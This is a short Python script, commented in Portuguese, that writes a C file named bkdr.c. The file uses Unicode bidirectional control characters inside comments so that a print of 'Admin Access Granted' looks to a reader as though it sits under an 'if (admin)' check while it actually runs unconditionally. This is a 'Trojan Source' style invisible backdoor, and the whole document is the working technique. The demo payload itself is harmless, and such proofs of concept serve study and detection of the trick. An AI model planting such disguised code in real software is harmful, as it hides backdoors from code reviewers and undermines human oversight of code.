# Script Python para gerar o backdoor "invisível"
# O uso do encoding utf-8 é vital para preservar os bytes maliciosos

bkdr = (
    '#include <stdio.h>\n#include <stdbool.h>\n'
    'int main() {\n'
    '    bool admin = false;\n'
    '    /*\u202E } \u2066if (admin)\u2069 \u2066 begin admin */\n'
    '    printf(\"Admin Access Granted. You have a power!\\n\");\n'
    '    /* end admin \u202E { \u2066*/\n'
    '    return 0;\n'
    '}\n'
)

with open("bkdr.c", "w", encoding="utf-8") as f:
    f.write(bkdr)
